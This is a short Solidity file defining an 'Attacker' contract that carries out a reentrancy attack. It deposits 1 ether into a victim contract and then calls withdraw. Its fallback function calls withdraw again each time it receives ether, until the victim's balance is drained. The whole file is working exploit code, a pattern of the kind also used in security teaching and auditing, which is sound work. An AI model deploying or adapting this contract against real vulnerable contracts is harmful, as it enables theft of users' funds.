// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.1;

interface IVictim {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVictim public victimContract;
    constructor(address _victimContract) {
        victimContract = IVictim(_victimContract);
    }

    fallback() external payable {
        if (address(victimContract).balance > 0) {
        victimContract.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "< 1 ETH");
        victimContract.deposit{value: 1 ether}();
        victimContract.withdraw();
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}
